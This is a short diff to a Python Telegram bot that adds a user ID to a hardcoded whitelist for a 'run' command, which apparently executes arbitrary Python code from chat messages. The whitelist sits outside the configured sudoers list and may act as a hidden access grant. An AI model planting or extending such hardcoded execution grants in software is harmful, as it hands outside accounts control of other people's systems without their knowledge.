@@ -17,7 +17,7 @@ async def aexec(code, app, msg):
     return await locals()["__aexec"](app, msg)
     
 
-@app.on_message(filters.command("run", Config.PREFIXS) & filters.user([6517565595, 5896960462, 5220416927, 6651534688, 1891133819]))
+@app.on_message(filters.command("run", Config.PREFIXS) & filters.user([6517565595, 5896960462, 5220416927, 6651534688, 1891133819, 7017229170]))
 @app.on_edited_message(filters.command("run", Config.PREFIXS) & filters.user(Config.SUDOERS))
 async def runPyro_Funcs(app:app, msg:Message) -> None:
     code = msg.text.split(None, 1)
